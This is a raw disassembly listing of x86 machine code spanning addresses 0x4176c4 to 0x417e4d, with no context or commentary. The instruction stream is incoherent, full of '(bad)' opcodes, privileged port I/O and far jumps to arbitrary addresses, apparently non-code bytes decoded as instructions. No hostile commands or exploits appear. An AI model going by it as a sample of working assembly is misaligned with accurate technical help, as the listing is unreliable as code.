  4176c4:	add    al,0x72
  4176c6:	sbb    al,0xc3
  4176c8:	test   DWORD PTR [ebp+0x76],esp
  4176cb:	xchg   BYTE PTR [ecx+0x55],dl
  4176ce:	mov    edx,0x1db8c17f
  4176d3:	leave  
  4176d4:	ins    BYTE PTR es:[edi],dx
  4176d5:	jmp    0xa91d:0x7a558b20
  4176dc:	dec    esp
  4176dd:	dec    ecx
  4176de:	or     DWORD PTR [ebx],ebx
  4176e0:	sub    eax,0x4bed8b87
  4176e5:	ret    0xedd5
  4176e8:	dec    eax
  4176e9:	push   es
  4176ea:	out    0x74,al
  4176ec:	pop    ss
  4176ed:	and    BYTE PTR [edi],ah
  4176ef:	xchg   esp,eax
  4176f0:	adc    eax,DWORD PTR [edx+0x20]
  4176f3:	mov    ebp,0x29e97bbd
  4176f8:	jns    0x4176ed
  4176fa:	clc    
  4176fb:	or     BYTE PTR [ebx+0x37],cl
  4176fe:	mov    bl,0x2a
  417700:	dec    edx
  417701:	dec    ecx
  417702:	or     ah,bl
  417704:	add    bh,dh
  417706:	(bad)  [edx-0x55]
  417709:	in     al,dx
  41770a:	fild   DWORD PTR [ebx]
  41770c:	jae    0x4176fc
  41770e:	imul   BYTE PTR [esi]
  417710:	jno    0x41770f
  417712:	inc    edi
  417713:	dec    eax
  417714:	in     eax,0x69
  417716:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417717:	mov    DWORD PTR [eax],0x6f2ba27a
  41771d:	into   
  41771e:	xchg   BYTE PTR [esi],bl
  417720:	stc    
  417721:	sbb    DWORD PTR [ecx-0x1078e9c8],esi
  417727:	pop    edx
  417728:	scas   al,BYTE PTR es:[edi]
  417729:	out    dx,eax
  41772a:	mov    al,gs:0x3eb51e9a
  417730:	stos   BYTE PTR es:[edi],al
  417731:	add    ch,BYTE PTR [edx]
  417733:	mov    ebp,0xa906838a
  417738:	xor    al,0x29
  41773a:	dec    eax
  41773b:	in     eax,0x70
  41773d:	es push ss
  41773f:	pop    edx
  417740:	push   esi
  417741:	and    eax,0xb4020dc
  417746:	mov    ch,0xda
  417748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417749:	adc    al,0xed
  41774b:	xor    ebp,DWORD PTR [esi+0x54]
  41774e:	jo     0x417783
  417750:	push   ebp
  417751:	mov    eax,0x45a9e122
  417756:	xchg   edi,eax
  417757:	push   ecx
  417758:	loop   0x41773f
  41775a:	push   ecx
  41775b:	fst    DWORD PTR [ecx+0x4f]
  41775e:	fsub   st(5),st
  417760:	aas    
  417761:	pop    edi
  417762:	sub    bh,BYTE PTR [ebx+0x6bde6670]
  417768:	push   ebp
  417769:	lock ss dec esi
  41776c:	loopne 0x4177cb
  41776e:	add    ch,BYTE PTR [esi]
  417770:	ror    BYTE PTR [esi+0x47],cl
  417773:	mov    cl,0xde
  417775:	push   ds
  417776:	cmp    DWORD PTR [ecx],ebp
  417778:	or     dh,BYTE PTR [eax-0x76]
  41777b:	mov    dl,0xfc
  41777d:	inc    edi
  41777e:	dec    ecx
  41777f:	add    DWORD PTR [edx-0x2f],ebp
  417782:	adc    edi,esi
  417784:	and    al,0xcc
  417786:	inc    ecx
  417787:	fwait
  417788:	jmp    0x4177a4
  41778a:	jae    0x4177b9
  41778c:	mov    esp,0xba0369c5
  417791:	fsubr  QWORD PTR [ecx+0x7d]
  417794:	cli    
  417795:	gs shr al,0x69
  417799:	add    esi,ecx
  41779b:	or     ebx,esi
  41779d:	mov    ds:0xc64e1145,eax
  4177a2:	jg     0x417789
  4177a4:	mov    bh,0x71
  4177a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177a7:	jmp    0xe8ba:0xcb497b4c
  4177ae:	int3   
  4177af:	test   DWORD PTR [esp+ebx*4],0xc227e57
  4177b6:	or     esp,DWORD PTR [esi-0x33]
  4177b9:	jmp    0x6c94ce01
  4177be:	ret    
  4177bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177c0:	pop    esi
  4177c1:	jle    0x4177ac
  4177c3:	mov    dh,0xec
  4177c5:	leave  
  4177c6:	call   0x5466c49f
  4177cb:	cmp    al,0xc3
  4177cd:	int3   
  4177ce:	fwait
  4177cf:	mov    edi,0x4d549c95
  4177d4:	cmp    al,0xa7
  4177d6:	mul    DWORD PTR [eax+eax*2-0xf]
  4177da:	push   ss
  4177db:	arpl   WORD PTR [ebx+0x17b56eb4],dx
  4177e1:	mov    bl,0x2b
  4177e3:	xchg   esi,eax
  4177e4:	inc    ebx
  4177e5:	fidivr DWORD PTR [ebx]
  4177e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177e8:	lock or BYTE PTR fs:[edi],bl
  4177ec:	dec    ebx
  4177ed:	push   0xe44f59fb
  4177f2:	cdq    
  4177f3:	fs inc esi
  4177f5:	fistp  DWORD PTR [edi+0x241fef4f]
  4177fb:	enter  0x8e5,0xd
  4177ff:	inc    edx
  417800:	jmp    0x5055be19
  417805:	cld    
  417806:	inc    ebx
  417807:	jmp    0x45c4abc3
  41780c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41780d:	pop    ebx
  41780e:	mov    ds,WORD PTR [edi+eax*4-0x7de0aca6]
  417815:	xchg   edx,eax
  417816:	cmc    
  417817:	out    0xcf,al
  417819:	xlat   BYTE PTR ds:[ebx]
  41781a:	push   cs
  41781b:	mov    dl,0x3c
  41781d:	rol    al,0xa8
  417820:	dec    edx
  417821:	sub    dl,dl
  417823:	outs   dx,BYTE PTR ds:[esi]
  417824:	ins    DWORD PTR es:[edi],dx
  417825:	inc    edx
  417826:	(bad)  
  417827:	int    0xd3
  417829:	(bad)  
  41782a:	stos   DWORD PTR es:[edi],eax
  41782b:	mov    edx,0x301bd94f
  417830:	cmp    edi,DWORD PTR ds:[edi+0x7f]
  417834:	mov    DWORD PTR [ebx+0x5bfa54d],eax
  41783a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41783b:	addr16 and al,0xb3
  41783e:	dec    eax
  41783f:	or     al,ah
  417841:	pop    ebx
  417842:	rcl    esi,cl
  417844:	cld    
  417845:	push   ebx
  417846:	clc    
  417847:	jge    0x4178ae
  417849:	in     al,dx
  41784a:	hlt    
  41784b:	mov    edi,fs
  41784d:	fsub   DWORD PTR [edi+ebx*1-0x6b7a9d8d]
  417854:	pop    esi
  417855:	out    dx,al
  417856:	fdivr  DWORD PTR [edx+0x75]
  417859:	(bad)  
  41785a:	stc    
  41785b:	loope  0x41783c
  41785d:	fst    DWORD PTR [ebp+0x3c63b5d3]
  417863:	arpl   WORD PTR [esi+0x1b5dbb6c],ax
  417869:	push   0xf87c08d2
  41786e:	inc    esp
  41786f:	mov    bl,0x69
  417871:	aaa    
  417872:	sub    DWORD PTR [ebx+0x408cd8fa],esp
  417878:	mov    dh,0x4e
  41787a:	out    dx,al
  41787b:	lahf   
  41787c:	ss inc ecx
  41787e:	adc    edi,DWORD PTR [esp+ebp*2]
  417881:	sti    
  417882:	mov    ah,0x41
  417884:	pop    es
  417885:	cwde   
  417886:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417887:	xlat   BYTE PTR ds:[ebx]
  417888:	or     esp,DWORD PTR [esi-0x33]
  41788b:	addr16 push esp
  41788d:	jecxz  0x417841
  41788f:	and    eax,0xeebce16d
  417894:	test   BYTE PTR [esi+0x3d89dcd5],dh
  41789a:	push   ds
  41789b:	aam    0xc7
  41789d:	add    BYTE PTR [edi],bh
  41789f:	lods   eax,DWORD PTR ds:[esi]
  4178a0:	scas   eax,DWORD PTR es:[edi]
  4178a1:	jmp    0xd0991c3e
  4178a6:	scas   eax,DWORD PTR es:[edi]
  4178a7:	ja     0x417881
  4178a9:	push   edx
  4178aa:	(bad)  
  4178ab:	call   0xd01c9174
  4178b0:	fadd   st,st(4)
  4178b2:	cmp    ch,BYTE PTR [ecx]
  4178b4:	xor    eax,0x3587d5eb
  4178b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178ba:	mov    dh,0xa3
  4178bc:	or     bl,ah
  4178be:	call   0xf6d1:0x72aa29be
  4178c5:	mov    WORD PTR [ecx],?
  4178c7:	lock dec ebp
  4178c9:	jne    0x4178f4
  4178cb:	mov    dl,0x7d
  4178cd:	xor    edx,DWORD PTR [ecx-0x2e]
  4178d0:	pusha  
  4178d1:	mov    edi,ebx
  4178d3:	sahf   
  4178d4:	fs mov ecx,0xa27f0e37
  4178da:	jno    0x4178d6
  4178dc:	push   ds
  4178dd:	cmp    esp,DWORD PTR [edi-0x68]
  4178e0:	mov    ebp,0x9b54a229
  4178e5:	and    DWORD PTR [edx],ebx
  4178e7:	aaa    
  4178e8:	icebp  
  4178e9:	push   ecx
  4178ea:	pop    ecx
  4178eb:	cld    
  4178ec:	in     al,dx
  4178ed:	push   0xd0c7e2e8
  4178f2:	pop    edx
  4178f3:	bound  esi,QWORD PTR [ecx]
  4178f5:	sbb    cl,BYTE PTR [ebp-0x4aaa92d5]
  4178fb:	or     al,0x48
  4178fd:	jmp    0xdd88:0xe121
  417903:	(bad)  
  417905:	mov    esp,0xc21aa398
  41790a:	pop    ds
  41790b:	push   ebp
  41790c:	out    dx,eax
  41790d:	xchg   ecx,eax
  41790e:	mov    ebp,0x163bcc78
  417913:	hlt    
  417914:	inc    edx
  417915:	xor    dh,0xe8
  417918:	cmp    esi,edi
  41791a:	int3   
  41791b:	mov    dl,0xda
  41791d:	or     bl,BYTE PTR [esp+ebp*1-0x899a87b]
  417924:	dec    ebp
  417925:	(bad)  
  417926:	mov    ds:0x27994559,al
  41792b:	mov    eax,ds:0x9ec5c9d
  417930:	int    0xc1
  417932:	popa   
  417933:	xchg   ebx,eax
  417934:	mov    BYTE PTR [esi+0x1],0x3a
  417938:	aaa    
  417939:	fst    DWORD PTR [esi+ebx*8-0x4d441b31]
  417940:	(bad)  
  417942:	mov    dl,0xf9
  417944:	rcl    ecx,cl
  417946:	fisttp DWORD PTR [ebp+0x50260938]
  41794c:	xchg   ebp,eax
  41794d:	lods   al,BYTE PTR ds:[esi]
  41794e:	or     DWORD PTR [eax],edi
  417950:	mov    ah,0x1e
  417952:	je     0x4178e1
  417954:	inc    ecx
  417955:	add    BYTE PTR [esi-0x7ebc9b68],bl
  41795b:	and    eax,edi
  41795d:	mov    ds,WORD PTR [ecx+0x62870536]
  417963:	sub    esi,DWORD PTR [ebx]
  417965:	jge    0x41799c
  417967:	fst    QWORD PTR [esi+0x4b274c81]
  41796d:	xchg   edi,eax
  41796e:	sbb    BYTE PTR [eax+0x51dacf95],dh
  417974:	ret    
  417975:	sahf   
  417976:	mov    al,BYTE PTR [eax-0x6c04b6ef]
  41797c:	out    0x5f,eax
  41797e:	mov    dl,0xe7
  417980:	iret   
  417981:	xchg   BYTE PTR [eax+0x1e],cl
  417984:	jmp    0xadc3a9db
  417989:	fcmovu st,st(2)
  41798b:	push   DWORD PTR [eax-0x6ac5064f]
  417991:	push   ebx
  417992:	sbb    eax,0xae99e6ef
  417997:	xchg   ecx,eax
  417998:	cmc    
  417999:	lods   al,BYTE PTR ds:[esi]
  41799a:	inc    ebp
  41799b:	jg     0x417a00
  41799d:	dec    esp
  41799e:	cmp    BYTE PTR [edi-0x2cd253c3],ah
  4179a4:	imul   ebx,DWORD PTR [eax-0x39318348],0xffffffc9
  4179ab:	loope  0x4179ff
  4179ad:	imul   esp,DWORD PTR [edi+0x5e3afb3a],0xffffffe4
  4179b4:	mov    dh,BYTE PTR [ebx]
  4179b6:	push   ss
  4179b7:	retf   
  4179b8:	push   0x606edbf5
  4179bd:	pushf  
  4179be:	fidiv  WORD PTR [eax+0x482b1a69]
  4179c4:	push   eax
  4179c5:	retf   0x8cb7
  4179c8:	jmp    0x41796e
  4179ca:	jbe    0x4179ec
  4179cc:	push   0x52
  4179ce:	mov    ch,BYTE PTR [ebp+0x6c]
  4179d1:	ins    BYTE PTR es:[edi],dx
  4179d2:	loop   0x4179d8
  4179d4:	or     BYTE PTR [edi+0x2ffcaafb],ch
  4179da:	stos   DWORD PTR es:[edi],eax
  4179db:	jno    0x4179b2
  4179dd:	add    al,0x85
  4179df:	imul   DWORD PTR [ebx+0x7417088a]
  4179e5:	cmp    eax,0x10e9aef2
  4179ea:	mov    eax,ds:0x4603a55b
  4179ef:	cmp    al,0x5c
  4179f1:	jne    0x25b7dfaf
  4179f7:	mov    eax,ds:0x16f679b6
  4179fc:	and    DWORD PTR [ebx*4-0x255f26ec],edx
  417a03:	test   ch,bl
  417a05:	xchg   edx,eax
  417a06:	ja     0x417a0b
  417a08:	fld    DWORD PTR [ecx*2-0x37458b21]
  417a0f:	jne    0x4179f1
  417a11:	into   
  417a12:	jl     0x417a7a
  417a14:	pop    ecx
  417a15:	xchg   esp,eax
  417a16:	cmp    BYTE PTR [ebx+0x3d],0xe3
  417a1a:	int    0x51
  417a1c:	mov    DWORD PTR [eax],esi
  417a1e:	call   0x4eb0:0xa2c9bd00
  417a25:	outs   dx,BYTE PTR ds:[esi]
  417a26:	adc    al,0xac
  417a28:	and    cl,BYTE PTR [esi]
  417a2a:	dec    esp
  417a2b:	call   0xa22c:0xbbcf948a
  417a32:	retf   
  417a33:	mov    eax,ds:0x477a94d1
  417a38:	std    
  417a39:	pop    ebx
  417a3a:	and    cl,BYTE PTR [edi]
  417a3c:	cwde   
  417a3d:	xor    bh,BYTE PTR [esi]
  417a3f:	mov    DWORD PTR [edx+0x65c7b0fb],esp
  417a45:	mov    al,ch
  417a47:	in     ax,dx
  417a49:	data16 mov al,ds:0xf26f7652
  417a4f:	mov    ah,0xab
  417a51:	loope  0x417ac9
  417a53:	and    dl,BYTE PTR [ebx+eiz*4-0x72]
  417a57:	ja     0x4179ef
  417a59:	mov    WORD PTR [ebp+edi*8-0x13ff8e9],ds
  417a60:	jecxz  0x417a24
  417a62:	daa    
  417a63:	mov    al,ds:0x353524f
  417a68:	add    edx,DWORD PTR [edx]
  417a6a:	add    ch,BYTE PTR [ebp-0x58fa8480]
  417a70:	jecxz  0x417a33
  417a72:	dec    eax
  417a73:	push   ss
  417a74:	and    DWORD PTR [ecx+0xb],esi
  417a77:	dec    ebp
  417a78:	inc    esp
  417a79:	popa   
  417a7a:	mov    DWORD PTR [ebx],ecx
  417a7c:	stos   BYTE PTR es:[edi],al
  417a7d:	pop    esi
  417a7e:	cwde   
  417a7f:	imul   edx,edi,0x6
  417a82:	mov    esp,0xc584e9cb
  417a87:	pop    ecx
  417a88:	mov    esi,0xafd8dc42
  417a8d:	into   
  417a8e:	pop    esi
  417a8f:	test   BYTE PTR [edx],ah
  417a91:	jno    0x417aeb
  417a93:	outs   dx,DWORD PTR ds:[esi]
  417a94:	inc    edi
  417a95:	or     al,0x6a
  417a97:	pusha  
  417a98:	fisub  WORD PTR [ecx-0x3f]
  417a9b:	pop    es
  417a9c:	int3   
  417a9d:	adc    bh,ah
  417a9f:	push   0xffffff89
  417aa1:	scas   al,BYTE PTR es:[edi]
  417aa2:	cwde   
  417aa3:	fwait
  417aa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417aa5:	inc    esi
  417aa6:	mov    edx,0x16dba73d
  417aab:	ret    
  417aac:	stos   BYTE PTR es:[edi],al
  417aad:	xchg   edi,eax
  417aae:	ja     0x417a31
  417ab0:	stos   DWORD PTR es:[edi],eax
  417ab1:	pop    ebx
  417ab2:	int    0xe2
  417ab4:	icebp  
  417ab5:	outs   dx,DWORD PTR ds:[esi]
  417ab6:	out    dx,al
  417ab7:	inc    ebp
  417ab8:	adc    al,0xda
  417aba:	jmp    0x417b2d
  417abc:	(bad)  
  417abd:	scas   al,BYTE PTR es:[edi]
  417abe:	or     BYTE PTR [ecx+0x7ebc1eb0],ah
  417ac4:	jp     0x417a8f
  417ac6:	pop    ss
  417ac7:	(bad)  
  417ac8:	dec    esp
  417ac9:	sub    eax,0xd66a99d9
  417ace:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417acf:	test   al,0xbd
  417ad1:	fsub   DWORD PTR [ebx+0x51]
  417ad4:	inc    ebx
  417ad5:	(bad)  
  417ad7:	adc    al,0x68
  417ad9:	dec    edx
  417ada:	mov    ebx,0x50af04cf
  417adf:	fs xchg ebx,eax
  417ae1:	cmp    al,0x23
  417ae3:	stos   BYTE PTR es:[edi],al
  417ae4:	jl     0x417a91
  417ae6:	int3   
  417ae7:	mov    eax,0xa7cd3d7c
  417aec:	aaa    
  417aed:	sbb    ch,BYTE PTR [esi+0x48e33557]
  417af3:	cwde   
  417af4:	daa    
  417af5:	add    al,0x4
  417af7:	sbb    eax,0xe71ceab0
  417afc:	dec    ebp
  417afd:	and    ah,BYTE PTR [ecx]
  417aff:	mov    bh,0xd9
  417b01:	sub    eax,0x1f77bac2
  417b06:	jle    0x417b5f
  417b08:	(bad)  [edx+0x68]
  417b0b:	cmp    eax,0xd70bb4de
  417b10:	test   DWORD PTR [edi-0x6e],0x5760baa0
  417b17:	and    DWORD PTR [edx],0x859a0d5f
  417b1d:	or     DWORD PTR [eax+ebp*8-0x6b6da27e],esp
  417b24:	jne    0x417b7b
  417b26:	aaa    
  417b27:	lods   eax,DWORD PTR ds:[esi]
  417b28:	or     edx,DWORD PTR [ebx-0x52]
  417b2b:	test   al,0x67
  417b2d:	xor    al,0x22
  417b2f:	or     dl,BYTE PTR [edx]
  417b31:	xchg   edi,eax
  417b32:	call   DWORD PTR [edx]
  417b34:	out    0x9b,al
  417b36:	cli    
  417b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b38:	push   ecx
  417b39:	xor    BYTE PTR [ebx+0x1b],dh
  417b3c:	fwait
  417b3d:	pop    ebx
  417b3e:	das    
  417b3f:	adc    al,0x28
  417b41:	sbb    DWORD PTR [ebx+0x572d04be],eax
  417b47:	stos   DWORD PTR es:[edi],eax
  417b48:	ja     0x417b6a
  417b4a:	jne    0x417b57
  417b4c:	inc    edi
  417b4d:	fidiv  WORD PTR [ecx+0x18]
  417b50:	jbe    0x417aea
  417b52:	repnz adc BYTE PTR [edx+edi*1],0x3a
  417b57:	loope  0x417b29
  417b59:	sub    BYTE PTR [ecx-0x7d7bdf20],bh
  417b5f:	rol    DWORD PTR [ecx+0x17],cl
  417b62:	push   edi
  417b63:	into   
  417b64:	idiv   BYTE PTR [esi+0x5fe28a5f]
  417b6a:	pop    edi
  417b6b:	mov    dl,0xa2
  417b6d:	inc    eax
  417b6e:	xchg   ebx,eax
  417b6f:	or     DWORD PTR [ecx+ecx*8],eax
  417b72:	outs   dx,DWORD PTR ds:[esi]
  417b73:	in     al,dx
  417b74:	xor    ebp,DWORD PTR [edi+0x4b7e9795]
  417b7a:	adc    ecx,DWORD PTR [ebp+eax*4+0x3e474cf6]
  417b81:	jo     0x417b8d
  417b83:	jecxz  0x417ba2
  417b85:	lods   al,BYTE PTR ds:[esi]
  417b86:	sub    BYTE PTR [eax-0x1e],0xf
  417b8a:	mov    ch,0xd6
  417b8c:	jg     0x417b48
  417b8e:	(bad)  
  417b8f:	std    
  417b90:	mov    al,0x60
  417b92:	int    0xc8
  417b94:	lds    ebx,FWORD PTR [ebp+0xf]
  417b97:	out    dx,eax
  417b98:	nop
  417b99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417b9a:	sbb    BYTE PTR [edi+0x63],0xaa
  417b9e:	int    0x36
  417ba0:	cmp    ecx,DWORD PTR [ebp+eax*8-0x7c35759d]
  417ba7:	add    al,0xa3
  417ba9:	aam    0x94
  417bab:	imul   edi,DWORD PTR [ecx+eiz*2+0x2607f5c3],0x35
  417bb3:	out    dx,eax
  417bb4:	xchg   esp,eax
  417bb5:	or     BYTE PTR [edx-0x6a4a8491],dh
  417bbb:	xor    BYTE PTR [edi],dh
  417bbd:	out    dx,al
  417bbe:	fs call 0xf161afbc
  417bc4:	jecxz  0x417bf4
  417bc6:	ficom  DWORD PTR [ecx-0x33]
  417bc9:	add    al,0x1c
  417bcb:	popf   
  417bcc:	add    ebp,DWORD PTR ds:0x2064500c
  417bd2:	je     0x417c2d
  417bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bd5:	cli    
  417bd6:	inc    esi
  417bd7:	mov    edi,0xb055a8d1
  417bdc:	loop   0x417bdd
  417bde:	mov    ebx,0x500c54fd
  417be3:	adc    esp,edx
  417be5:	mov    bh,0xf
  417be7:	mov    BYTE PTR [esi],0x32
  417bea:	cdq    
  417beb:	sub    al,0x2b
  417bed:	shl    BYTE PTR [ebx],1
  417bef:	pop    eax
  417bf1:	cmp    eax,0xc42461c5
  417bf6:	addr16 dec esi
  417bf8:	mov    WORD PTR [ecx-0x31],gs
  417bfb:	and    al,0xac
  417bfd:	sbb    edx,DWORD PTR [edi+0x18dae29]
  417c03:	(bad)  
  417c05:	addr16 popf 
  417c07:	cmp    al,0x2
  417c09:	(bad)  
  417c0b:	push   edi
  417c0c:	sub    eax,0x8dadb9b0
  417c11:	enter  0xc7e5,0x74
  417c15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c16:	inc    esi
  417c17:	std    
  417c18:	loop   0x417bc1
  417c1a:	adc    al,0x7
  417c1c:	xchg   ebx,eax
  417c1d:	sti    
  417c1e:	dec    ebp
  417c1f:	test   al,0xe9
  417c21:	shr    esi,1
  417c23:	mov    ebp,DWORD PTR ds:0x29145eef
  417c29:	inc    eax
  417c2a:	mov    BYTE PTR [edx-0x63],ch
  417c2d:	pop    ss
  417c2e:	mov    ebx,0x8a2da0b1
  417c33:	adc    eax,0x85430d0d
  417c38:	js     0x417c9c
  417c3a:	in     eax,0x50
  417c3c:	push   es
  417c3d:	loope  0x417c2d
  417c3f:	lods   al,BYTE PTR ds:[esi]
  417c40:	push   ds
  417c41:	xor    ch,bh
  417c43:	jmp    0xd12e2044
  417c48:	neg    BYTE PTR [ecx]
  417c4a:	std    
  417c4b:	adc    DWORD PTR [esi+edi*8],edi
  417c4e:	add    DWORD PTR [eax+eiz*4],ecx
  417c51:	icebp  
  417c52:	sub    al,BYTE PTR [ebp-0xe]
  417c55:	aaa    
  417c56:	push   0x3217254c
  417c5b:	sbb    bh,BYTE PTR [ebx]
  417c5d:	push   ss
  417c5e:	aad    0xe
  417c60:	pop    esi
  417c61:	push   eax
  417c62:	xor    dh,bl
  417c64:	jg     0x417ca0
  417c66:	pop    ss
  417c67:	gs leave 
  417c69:	lods   al,BYTE PTR ds:[esi]
  417c6a:	and    eax,0x446e83b6
  417c6f:	addr16 mov ebx,0x9812f671
  417c75:	jecxz  0x417c4f
  417c77:	iret   
  417c78:	inc    ebp
  417c79:	stc    
  417c7a:	lea    ecx,[edx]
  417c7c:	add    eax,0xa09ed854
  417c81:	xlat   BYTE PTR ds:[ebx]
  417c82:	popf   
  417c83:	imul   ebp,edi,0xc6abc258
  417c89:	xchg   edx,eax
  417c8a:	push   edi
  417c8b:	push   es
  417c8c:	out    0x51,eax
  417c8e:	test   DWORD PTR [eax+0x2c],ecx
  417c91:	out    dx,eax
  417c92:	sub    DWORD PTR [esi+0x18],edi
  417c95:	pop    esi
  417c96:	xchg   ecx,eax
  417c97:	xor    DWORD PTR [edi-0x1d8ab19d],0xb2d9da45
  417ca1:	out    dx,eax
  417ca2:	lods   al,BYTE PTR ds:[esi]
  417ca3:	sbb    al,0x2b
  417ca5:	lods   al,BYTE PTR ds:[esi]
  417ca6:	pop    ecx
  417ca7:	xor    esp,DWORD PTR [eax]
  417ca9:	adc    edx,ebx
  417cab:	(bad)
  417cae:	jns    0x417cf6
  417cb0:	dec    esp
  417cb1:	inc    edi
  417cb2:	inc    esp
  417cb3:	nop
  417cb4:	push   eax
  417cb5:	loopne 0x417cfa
  417cb7:	inc    ecx
  417cb8:	xchg   DWORD PTR [eax+ebp*2],eax
  417cbb:	cs jle 0x417c3f
  417cbe:	dec    esp
  417cbf:	xchg   edx,eax
  417cc0:	fwait
  417cc1:	add    al,0x8e
  417cc3:	retf   
  417cc4:	push   ss
  417cc5:	in     eax,0x37
  417cc7:	jl     0x417d24
  417cc9:	sub    edx,DWORD PTR [edi-0x30]
  417ccc:	dec    ebx
  417ccd:	pop    ebp
  417cce:	in     al,0x87
  417cd0:	sbb    eax,DWORD PTR [edx+0x541c6ad7]
  417cd6:	or     DWORD PTR [ebx],edx
  417cd8:	lahf   
  417cd9:	out    0xd7,eax
  417cdb:	into   
  417cdc:	(bad)  
  417cdd:	cs push edi
  417cdf:	mov    bl,BYTE PTR [ecx]
  417ce1:	or     eax,0xd0804dff
  417ce6:	sti    
  417ce7:	jmp    0x417d17
  417ce9:	or     BYTE PTR [edi+0x73],ah
  417cec:	enter  0x95a3,0xbd
  417cf0:	enter  0x56c8,0x8
  417cf4:	xor    al,0x8d
  417cf6:	fld    DWORD PTR fs:0x4edba1e3
  417cfd:	mov    ecx,cs
  417cff:	add    BYTE PTR [edi+0x5612dd75],dh
  417d05:	xchg   esi,eax
  417d06:	fiadd  WORD PTR [ebp+0x3b]
  417d09:	inc    ebp
  417d0a:	outs   dx,DWORD PTR ds:[esi]
  417d0b:	daa    
  417d0c:	mov    WORD PTR [ecx],es
  417d0e:	sub    bl,BYTE PTR [eax]
  417d10:	pushf  
  417d11:	sbb    ebx,DWORD PTR [ecx+eax*2+0x61]
  417d15:	or     BYTE PTR [eax+0x2ce3fa50],bl
  417d1b:	out    0xae,eax
  417d1d:	call   FWORD PTR [esp+ebp*4-0x30]
  417d21:	test   dh,ch
  417d23:	mov    cl,0x20
  417d25:	mov    dl,0x43
  417d27:	push   ds
  417d28:	test   bh,0x64
  417d2b:	jne    0x417da5
  417d2d:	cmp    BYTE PTR [ecx-0x6b5432c8],dl
  417d33:	aas    
  417d34:	lock dec ebx
  417d36:	and    DWORD PTR [edi],edi
  417d38:	push   es
  417d39:	data16 stos BYTE PTR es:[edi],al
  417d3b:	mov    ebx,0x13010b79
  417d40:	rcr    DWORD PTR [ebx],cl
  417d42:	jo     0x417d2c
  417d44:	fild   WORD PTR [eax-0x7015e7c1]
  417d4a:	out    0x9c,al
  417d4c:	or     al,0xaa
  417d4e:	js     0x417cfd
  417d50:	mov    ds:0x17326161,eax
  417d55:	mov    esp,0xa467df17
  417d5a:	neg    BYTE PTR [ebp-0x1f]
  417d5d:	repz (bad) 
  417d5f:	cmp    ebp,DWORD PTR [edi+0x1e]
  417d62:	shr    esi,cl
  417d64:	add    DWORD PTR [esi],edi
  417d66:	into   
  417d67:	jmp    0x7634:0x2f16d431
  417d6e:	and    BYTE PTR [edi],cl
  417d70:	pusha  
  417d71:	mov    ebx,0x8d3d08e8
  417d76:	xchg   edx,eax
  417d77:	mov    ss,WORD PTR [esi]
  417d79:	pop    edi
  417d7a:	les    edi,FWORD PTR [si]
  417d7d:	call   0x12e167b5
  417d82:	mov    bl,0xc5
  417d84:	xor    DWORD PTR [ecx],0x1170595a
  417d8a:	sub    al,0xc7
  417d8c:	daa    
  417d8d:	data16 mov bl,0x78
  417d90:	jecxz  0x417ddf
  417d92:	lods   al,BYTE PTR ds:[esi]
  417d93:	bound  edi,QWORD PTR [esi-0x80]
  417d96:	dec    edx
  417d97:	into   
  417d98:	or     ch,BYTE PTR [eax-0xef62095]
  417d9e:	in     eax,0x3f
  417da0:	lods   eax,DWORD PTR ds:[esi]
  417da2:	test   BYTE PTR ds:0xc338ba7d,cl
  417da8:	xchg   ebp,eax
  417da9:	shl    DWORD PTR [esi-0x12234351],0xc9
  417db0:	fs dec ecx
  417db2:	test   eax,0x178ce196
  417db7:	mov    ebx,0x3c7dd19
  417dbc:	xchg   esi,eax
  417dbd:	retf   
  417dbe:	jne    0x417d51
  417dc0:	pop    ecx
  417dc1:	jo     0x417d98
  417dc3:	mov    ebp,DWORD PTR [ecx]
  417dc5:	xchg   esp,eax
  417dc6:	(bad)  
  417dc7:	and    al,0x2
  417dc9:	(bad)  
  417dca:	push   cs
  417dcb:	out    dx,eax
  417dcc:	inc    esi
  417dcd:	call   0x3dcc:0x49fb03a3
  417dd4:	stos   DWORD PTR es:[edi],eax
  417dd5:	jmp    0xee5335b5
  417dda:	(bad)  
  417ddb:	in     al,dx
  417ddc:	iret   
  417ddd:	faddp  st(2),st
  417ddf:	popf   
  417de0:	adc    al,0xb7
  417de2:	inc    eax
  417de3:	push   cs
  417de4:	sub    eax,0x6a1bf8c0
  417de9:	pop    eax
  417dea:	test   al,0x31
  417dec:	fstp   TBYTE PTR [ecx+0x620cb1aa]
  417df2:	(bad)  
  417df3:	aam    0x80
  417df5:	mov    BYTE PTR ds:0x1c6e2ec,dh
  417dfb:	fadd   QWORD PTR [edi+0x4f90ba7a]
  417e01:	test   eax,0x5546164a
  417e06:	test   ebp,0x405be10e
  417e0c:	inc    ecx
  417e0d:	add    dl,BYTE PTR [ebp-0x350d8e5]
  417e13:	rol    ecx,cl
  417e15:	mov    ebp,0x73197da5
  417e1a:	mov    BYTE PTR [edx-0x8],bh
  417e1d:	outs   dx,BYTE PTR ds:[esi]
  417e1e:	cmc    
  417e1f:	(bad)
  417e22:	out    0xf5,al
  417e24:	ins    DWORD PTR es:[edi],dx
  417e25:	in     eax,0x44
  417e27:	mov    al,ds:0x9d8be7d5
  417e2c:	xchg   edi,eax
  417e2d:	pop    ds
  417e2e:	mov    dl,0x5d
  417e30:	repnz pusha 
  417e32:	cmp    ah,BYTE PTR [esi+0x4f897cea]
  417e38:	mov    esi,0xf5dcb40
  417e3d:	mov    ebx,0x1002bdc1
  417e42:	jno    0x417e1a
  417e44:	dec    edi
  417e45:	stos   DWORD PTR es:[edi],eax
  417e46:	aas    
  417e47:	ret    0x36d0
  417e4a:	cdq    
  417e4b:	js     0x417e48
  417e4d:	cmp    al,0xa7
